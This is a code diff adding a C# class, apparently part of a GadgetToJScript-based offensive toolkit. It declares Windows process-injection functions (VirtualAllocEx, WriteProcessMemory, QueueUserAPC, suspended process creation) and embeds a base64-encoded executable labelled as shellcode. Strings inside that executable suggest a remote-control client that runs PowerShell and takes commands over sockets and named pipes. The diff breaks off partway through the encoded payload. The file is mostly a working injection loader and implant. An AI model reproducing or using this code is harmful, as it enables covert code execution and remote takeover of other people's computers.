+++ Client/external/GadgetToJScript/GadgetToJScript.cs
@@ -1,0 +1,169 @@
+using System;
+using System.Runtime.InteropServices;
+
+   public class TestClass
+        {
+            [DllImport("Kernel32", SetLastError = true, CharSet = CharSet.Unicode)]
+            public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
+
+            [DllImport("Kernel32", SetLastError = true, CharSet = CharSet.Unicode)]
+            public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+            [DllImport("Kernel32", SetLastError = true, CharSet = CharSet.Unicode)]
+            public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [MarshalAs(UnmanagedType.AsAny)] object lpBuffer, uint nSize, ref uint lpNumberOfBytesWritten);
+
+            [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+            public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
+
+            [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+            public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
+
+            [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+            public static extern uint ResumeThread(IntPtr hThread);
+
+            [DllImport("Kernel32", SetLastError = true, CharSet = CharSet.Unicode)]
+            public static extern bool CloseHandle(IntPtr hObject);
+
+            [DllImport("Kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
+            public static extern bool CreateProcess(IntPtr lpApplicationName, string lpCommandLine, IntPtr lpProcAttribs, IntPtr lpThreadAttribs, bool bInheritHandles, uint dwCreateFlags, IntPtr lpEnvironment, IntPtr lpCurrentDir, [In] ref STARTUPINFO lpStartinfo, out PROCESS_INFORMATION lpProcInformation);
+
+            public enum ProcessAccessRights
+            {
+                All = 0x001F0FFF,
+                Terminate = 0x00000001,
+                CreateThread = 0x00000002,
+                VirtualMemoryOperation = 0x00000008,
+                VirtualMemoryRead = 0x00000010,
+                VirtualMemoryWrite = 0x00000020,
+                DuplicateHandle = 0x00000040,
+                CreateProcess = 0x000000080,
+                SetQuota = 0x00000100,
+                SetInformation = 0x00000200,
+                QueryInformation = 0x00000400,
+                QueryLimitedInformation = 0x00001000,
+                Synchronize = 0x00100000
+            }
+
+            public enum ThreadAccess : int
+            {
+                TERMINATE = (0x0001),
+                SUSPEND_RESUME = (0x0002),
+                GET_CONTEXT = (0x0008),
+                SET_CONTEXT = (0x0010),
+                SET_INFORMATION = (0x0020),
+                QUERY_INFORMATION = (0x0040),
+                SET_THREAD_TOKEN = (0x0080),
+                IMPERSONATE = (0x0100),
+                DIRECT_IMPERSONATION = (0x0200),
+                THREAD_HIJACK = SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT,
+                THREAD_ALL = TERMINATE | SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT | SET_INFORMATION | QUERY_INFORMATION | SET_THREAD_TOKEN | IMPERSONATE | DIRECT_IMPERSONATION
+            }
+
+            public enum MemAllocation
+            {
+                MEM_COMMIT = 0x00001000,
+                MEM_RESERVE = 0x00002000,
+                MEM_RESET = 0x00080000,
+                MEM_RESET_UNDO = 0x1000000,
+                SecCommit = 0x08000000
+            }
+
+            public enum MemProtect
+            {
+                PAGE_EXECUTE = 0x10,
+                PAGE_EXECUTE_READ = 0x20,
+                PAGE_EXECUTE_READWRITE = 0x40,
+                PAGE_EXECUTE_WRITECOPY = 0x80,
+                PAGE_NOACCESS = 0x01,
+                PAGE_READONLY = 0x02,
+                PAGE_READWRITE = 0x04,
+                PAGE_WRITECOPY = 0x08,
+                PAGE_TARGETS_INVALID = 0x40000000,
+                PAGE_TARGETS_NO_UPDATE = 0x40000000,
+            }
+            [StructLayout(LayoutKind.Sequential)]
+            public struct PROCESS_INFORMATION
+            {
+                public IntPtr hProcess;
+                public IntPtr hThread;
+                public int dwProcessId;
+                public int dwThreadId;
+            }
+
+            [StructLayout(LayoutKind.Sequential)]
+            internal struct PROCESS_BASIC_INFORMATION
+            {
+                public IntPtr Reserved1;
+                public IntPtr PebAddress;
+                public IntPtr Reserved2;
+                public IntPtr Reserved3;
+                public IntPtr UniquePid;
+                public IntPtr MoreReserved;
+            }
+
+            [StructLayout(LayoutKind.Sequential)]
+            //internal struct STARTUPINFO
+            public struct STARTUPINFO
+            {
+                uint cb;
+                IntPtr lpReserved;
+                IntPtr lpDesktop;
+                IntPtr lpTitle;
+                uint dwX;
+                uint dwY;
+                uint dwXSize;
+                uint dwYSize;
+                uint dwXCountChars;
+                uint dwYCountChars;
+                uint dwFillAttributes;
+                public uint dwFlags;
+                public ushort wShowWindow;
+                ushort cbReserved;
+                IntPtr lpReserved2;
+                IntPtr hStdInput;
+                IntPtr hStdOutput;
+                IntPtr hStdErr;
+            }
+
+
+            public static PROCESS_INFORMATION StartProcess(string binaryPath)
+            {
+                uint flags = 0x00000004;
+
+                STARTUPINFO startInfo = new STARTUPINFO();
+                PROCESS_INFORMATION procInfo = new PROCESS_INFORMATION();
+                CreateProcess((IntPtr)0, binaryPath, (IntPtr)0, (IntPtr)0, false, flags, (IntPtr)0, (IntPtr)0, ref startInfo, out procInfo);
+
+                return procInfo;
+            }
+
+            public TestClass()
+            {
+		
+		        //Add the shellcode
+                string b64 = "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MwB2Ai4AOwB2Ai4AQwBoAi4ASwB8Ai4AUwB2Ai4AWwB2Ai4AYwCUAi4AawC+Ai4AcwDLAiYAeQCoALMA6wD5ABgBSwGIAZ0BsgHLAQIAAQAAAAcFMgIBAAEAAwBJAFoABIAAAAEAAAAAAAAAAAAAAAAAQQcAAAQAAAAAAAAAAAAAANYBRwAAAAAAAQAAAAAAAAAAAAAA3wFtBAAAAAAEAAAAAAAAAAAAAADWAU4EAAAAAAQAAAAAAAAAAAAAANYBTwEAAAAAAAAAQ29sbGVjdGlvbmAxAElFbnVtZXJhdG9yYDEASW50MzIAZ2V0X1VURjgAPE1vZHVsZT4AU3lzdGVtLklPAHJlbW90ZUVQAG1zY29ybGliAGRvTWFnaWMAU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMAUmVhZABUaHJlYWQAU2VuZABCaW5kAENyZWF0ZVJ1bnNwYWNlAGdldF9Tb2NrZXRFcnJvckNvZGUAc2V0X1JlYWRNb2RlAFBpcGVUcmFuc21pc3Npb25Nb2RlAGdldF9NZXNzYWdlAFJlYWRQaXBNZXNzYWdlAHRfbWVzc2FnZQBJbnZva2UASURpc3Bvc2FibGUAQ29uc29sZQBBcHBlbmRMaW5lAFdyaXRlTGluZQBDcmVhdGVQaXBlbGluZQBwaXBlAFByb3RvY29sVHlwZQBTb2NrZXRUeXBlAFN5c3RlbS5Db3JlAENsb3NlAERpc3Bvc2UAVHJ5UGFyc2UAc2V0X0FwYXJ0bWVudFN0YXRlAGdldF9Jc01lc3NhZ2VDb21wbGV0ZQBXcml0ZQBHdWlkQXR0cmlidXRlAERlYnVnZ2FibGVBdHRyaWJ1dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAFRhcmdldEZyYW1ld29ya0F0dHJpYnV0ZQBBc3NlbWJseUZpbGVWZXJzaW9uQXR0cmlidXRlAEFzc2VtYmx5Q29uZmlndXJhdGlvbkF0dHJpYnV0ZQBBc3NlbWJseURlc2NyaXB0aW9uQXR0cmlidXRlAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAQXNzZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29weXJpZ2h0QXR0cmlidXRlAEFzc2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBCeXRlAHZhbHVlAGRvUmVjaXZlAFJlY2VpdmUAZndTb2NrZXRfYWxpdmUAZG9SZWNpdmVOYXRpdmUAU3RhcnRTZXJ2ZXJOYXRpdmUAbXljbGllbnQuZXhlAEluZGV4T2YAU3lzdGVtLlRocmVhZGluZwBFbmNvZGluZwBTeXN0ZW0uUnVudGltZS5WZXJzaW9uaW5nAFRvU3RyaW5nAEdldFN0cmluZwBTdWJzdHJpbmcAbmFtZXBpcGVzdHJpbmcAaXBzdHJpbmcAZ2V0X0xlbmd0aABNc2dQYWNrAFN5c3RlbS5Db2xsZWN0aW9ucy5PYmplY3RNb2RlbABQaXBlU3RyZWFtAE5hbWVkUGlwZVNlcnZlclN0cmVhbQBOYW1lZFBpcGVDbGllbnRTdHJlYW0ATWVtb3J5U3RyZWFtAFByb2dyYW0AU3lzdGVtAE1zZ19JbgBPcGVuAExpc3RlbgBNYWluAFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24AU3lzdGVtLkdsb2JhbGl6YXRpb24AU3lzdGVtLlJlZmxlY3Rpb24AQ29tbWFuZENvbGxlY3Rpb24AV2FpdEZvckNvbm5lY3Rpb24AUGlwZURpcmVjdGlvbgBGb3JtYXRFeGNlcHRpb24AU29ja2V0RXhjZXB0aW9uAHNldF9jbGVhblBzUnVuAGRvUHNSdW4AU29ja2V0U2h1dGRvd24ATnVtYmVyRm9ybWF0SW5mbwBnZXRfQ3VycmVudEluZm8ATXlBcHAAQ2hhcgBJRm9ybWF0UHJvdmlkZXIAU3RyaW5nQnVpbGRlcgBzZW5kZXIAbGlzdGVuZXIAU3RhcnRQaXBTZXJ2ZXIAU3RhcnRTZXJ2ZXIAVG9Mb3dlcgBTb2NrZXRFcnJvcgBJRW51bWVyYXRvcgBHZXRFbnVtZXJhdG9yAC5jdG9yAFN5c3RlbS5EaWFnbm9zdGljcwBnZXRfQ29tbWFuZHMAU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5SdW5zcGFjZXMAU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzAFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMARGVidWdnaW5nTW9kZXMATnVtYmVyU3R5bGVzAFN5c3RlbS5JTy5QaXBlcwBHZXRCeXRlcwBhcmdzAFN5c3RlbS5Db2xsZWN0aW9ucwBQU1RocmVhZE9wdGlvbnMAc2V0X1RocmVhZE9wdGlvbnMAcnMASVBBZGRyZXNzAFN5c3RlbS5OZXQuU29ja2V0cwBDb25jYXQAUFNPYmplY3QAQ29ubmVjdABTeXN0ZW0uTmV0AGZ3U29ja2V0AHNvY2tldABTdGFydFBpcGVDbGluZXQAU3BsaXQAaW5pdABTdGFydENsaWVudABteWNsaWVudABnZXRfQ3VycmVudABDcmVhdGVJUEVuZFBvaW50AGdldF9SZW1vdGVFbmRQb2ludABmd0VuZFBvaW50AGVuZFBvaW50AGVuZHBvaW50AEFjY2VwdABBZGRTY3JpcHQAUGFyYW1ldGVyaXplZFRocmVhZFN0YXJ0AG5hbWVwaXBlaG9zdABzZXRfUmVjZWl2ZVRpbWVvdXQAbG9jYWxTb2NrZXRUaW1lb3V0AHRlc3RJbnB1dABNb3ZlTmV4dABTeXN0ZW0uVGV4dABUb0FycmF5AGdldF9BZGRyZXNzRmFtaWx5AFJ1bnNwYWNlRmFjdG9yeQBvcF9FcXVhbGl0eQAAAAAAL0kAbgB2AGEAbABpAGQAIABlAG4AZABwAG8AaQBuAHQAIABmAG8AcgBtAGEAdAAAI0kAbgB2AGEAbABpAGQAIABpAHAALQBhAGQAcgBlAHMAcwABGUkAbgB2AGEAbABpAGQAIABwAG8AcgB0AAARWwBNAFkATQBTAFMAVABdAAARWwBNAFkATQBTAEUARABdAAABAC1mAHcAUwBvAGMAawBlAHQAXwBhAGwAaQB2AGUAIABpAHMAIAB0AHIAdQBlAAApZgB3AFMAbwBjAGsAZQB0ACAAaQBzACAAbgBvAHQAIABuAHUAbABsAAA3VwBhAGkAdABpAG4AZwAgAGYAbwByACAAYQAgAGMAbwBuAG4AZQBjAHQAaQBvAG4ALgAuAC4AADVVAG4AZQB4AHAAZQBjAHQAZQBkACAAZQB4AGMAZQBwAHQAaQBvAG4AIAA6ACAAewAwAH0AADdXAGEAaQB0AGkAbgBnACAAZgBvAHIAIABjAG8AbQBtAGEAbgBkACAAdABhAGcAIAAuAC4ALgAAM1IAZQBjAGkAZQB2AGUAZAAgAEMAbwBtAG0AYQBuAGQAIAB0AGEAZwA6ACAAewAwAH0AACdDAE8ATQBNAEEATgBEAF8AVABBAEcAXwBTAFUAQwBDAEUAUwBTAABDWwBEAEUAQgBVAEcAXQAgAFMAbwBtAGUAdABoAGkAbgBnACAAdwByAG8AbgBnACAAdwBpAHQAaAAgAHMAZQBuAGQAADFGAGkAbgBpAHMAaABlAGQAIABzAGUAbgBkAGkAbgBnACAAQQBDAEsAIAB0AGEAZwAAN1QAcgB5AGkAbgBnACAAdABvACAAZwBlAHQAIABjAG8AbQBtAGEAbgBkAHMAIAAuAC4ALgAgAAArUgBlAGMAaQBlAHYAZQBkACAAQwBvAG0AbQBhAG4AZAA6ACAAewAwAH0AAB9DAE8ATQBNAEEATgBEAF8AUwBVAEMAQwBFAFMAUwAABXAAcwAAFXAAbwB3AGUAcgBzAGgAZQBsAGwAABNbAEUAUgBSAE8AUgBdADoAIAAAMVsARABFAEIAVQBHAF0AIABjAG0AZAAgAGUAeABlAGMAdQB0AGUAZAAgAC4ALgAuAAApUwBlAG4AZAAgAHIAZQBzAHUAbAB0ACAAZgBpAG4AaQBzAGgAZQBkAAAjWwBEAEUAQgBVAEcAXQAgAEEAQwBLACAAbQBzAGcAOgAgAAAbUABTAFIAVQBOAF8AUwBVAEMAQwBFAFMAUwAAH1sAUABzAFIAdQBuAF0AIABTAHUAYwBjAGUAcwBzAAAlWwBQAHMAUgB1AG4AXQAgAEYAYQBpAGwAZQBkACAALgAuAC4AAA9wAHMAcgBlAHMAZQB0AAA5WwBEAEUAQgBVAEcAXQAgAHAAcwByAGUAcwBlAHQAIABlAHgAZQBjAHUAdABlAGQAIAAuAC4ALgAAH1AAUwBSAEUAUwBFAFQAXwBTAFUAQwBDAEUAUwBTAAAFZgB3AAAvWwBEAEUAQgBVAEcAXQAgAGYAdwAgAGUAeABlAGMAdQB0AGUAZAAgAC4ALgAuAAAVRgBXAF8AUwBVAEMAQwBFAFMAUwAAB2YAdwBxAAApRABvAGkAbgBnACAAcgBlAGEAZAAgAGEAbgBkACAAdwByAGkAdABlAAARRABFAEIAVQBHADoAOgAgAAA5RABFAEIAVQBHADoAOgAgAHMAdAByAF8AZgB3AHEAXwBtAHMAZwAgAGwAZQBuAGcAdABoADoAIAAAMUQARQBCAFUARwA6ADoAIABmAHcAcQBfAG0AcwBnACAAbABlAG4AZwB0AGgAOgAgAABvZgB3AFMAbwBjAGsAZQB0ACAARgBJAE4ARQBEACwAIAB0AHIAeQBpAG4AZwAgAHQAbwAgAGwAaQBzAHQAZQBuACAAZgBvAHIAIABhAG4AbwB0AGgAZQByACAAYwBvAG4AbgBlAGMAdABpAG8AbgAAF0YAVwBfAE4ATwBUAFIARQBBAEQAWQAAIUYAVwBfAE4ATwBUAFIARQBBAEQAWQAgAFMAZQBuAHQAAClIAHQAdABwACAARwBlAHQAIABzAHUAYwBjAGUAcwBzACAALgAuAC4AABdHAG8AdAAgAHIAZQBwAG8AbgBzAGUAABtSAGUAcwBwAG8AbgBzAGUAIABzAGUAbgB0AABHZgB3AFMAbwBjAGsAZQB0ACAAZABvAGUAcwBuACcAdAAgAHcAYQBuAHQAIAByAGUAcwBwAG8AbgBzAGUAIAAuAC4ALgAgAAEjUwBlAG4AZABpAG4AZwAgAG4AbwB0ACAAcgBlAGEAZAB5AAAJZQB4AGkAdAAAK1MAbwBjAGsAZQB0AEUAeABjAGUAcAB0AGkAbwBuACAAOgAgAHsAMAB9AAAfSwBlAGUAcAAgAHQAcgB5AGkAbgBnACAALgAuAC4AADdbACoAXQAgAFcAYQBpAHQAaQBuAGcAIABmAG8AcgAgAHAAaQBwACAAbQBlAHMAcwBhAGcAZQAAK1sAKgBdACAAVABhAGcAIABSAGUAYwBlAGkAdgBlAGQAOgAgAHsAMAB9AAAdWwAqAF0AIABBAGMAawAgAFMAZQBuAHQALgAuAAArWwAqAF0AIABDAE0ARAAgAFIAZQBjAGUAaQB2AGUAZAA6